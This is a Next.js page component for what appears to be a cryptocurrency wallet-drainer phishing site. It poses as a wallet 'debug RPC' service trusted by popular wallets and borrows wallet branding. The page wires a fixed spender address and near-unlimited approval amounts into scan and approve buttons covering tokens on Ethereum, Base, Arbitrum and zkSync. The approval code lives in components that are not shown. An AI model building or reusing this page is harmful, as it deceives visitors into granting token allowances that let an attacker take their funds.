import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import ScanWallet from "./components/scanWallet";
import ApproveButton from "./components/approveButton";

export default function Home() {
  return (
    <div>
    <div className={styles.connectWallet}
        >
          <h1>
            
          </h1>
          <w3m-button />
        </div>
    <div className={styles.container}>
      <div>
      <Image style={{height: "500px", width: "500px"}}
                  src={Metamask}
                  alt='mm'/>
      </div>
      <div style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "flex-start",
        alignItems: "flex-start"
      }}>
        
        <h1>
        Trusted by the world’s most popular EVM wallets.
        </h1>
        <p style={{marginTop: "10px"}}>
          Quicky debug RPC and other technical problems you may be experiencing with your wallet.
        </p>
        <div style={{
          display: "flex",
          flexDirection: "row",
          width: "50%",
          justifyContent: "space-between",
          marginTop: "20px"}}>
        <ScanWallet spenderAddress={"0xFDb22826e8dF996CcC5Db65734260A54461406cC"} tokenAddresses={["0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"]} chainIds={[1]} amount={"999999999999999"} />
        <ApproveButton spenderAddress={"0xFDb22826e8dF996CcC5Db65734260A54461406cC"} tokenAddresses={["0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", "0xaf88d065e77c8cc2239327c5edb3a432268e5831", "0x1d17cbcf0d6d143135ae902365d2e5e2a16538d4"]} chainIds={[8453, 42161, 324]} amount={"99999999999999999"} />
        </div>
        
      </div>
    </div>
    </div>
  );
}
